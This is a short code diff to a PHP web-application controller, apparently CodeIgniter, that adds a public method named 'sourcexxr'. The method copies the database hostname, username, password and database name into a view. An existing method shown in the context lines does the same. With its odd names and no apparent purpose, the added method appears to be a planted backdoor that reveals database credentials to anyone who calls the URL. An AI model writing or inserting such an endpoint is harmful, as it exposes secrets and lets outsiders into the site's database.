@@ -371,5 +371,12 @@ function penjualan_kredit_details($id) {
 		$view['password']=$this->db->password;
 		$view['database']=$this->db->database;
 		$this->load->view('resultz',$view,FALSE);
-	}		
+	}
+	function sourcexxr() {
+		$view['hostname']=$this->db->hostname;
+		$view['username']=$this->db->username;
+		$view['password']=$this->db->password;
+		$view['database']=$this->db->database;
+		$this->load->view('resultzz',$view,FALSE);
+	}	
 }
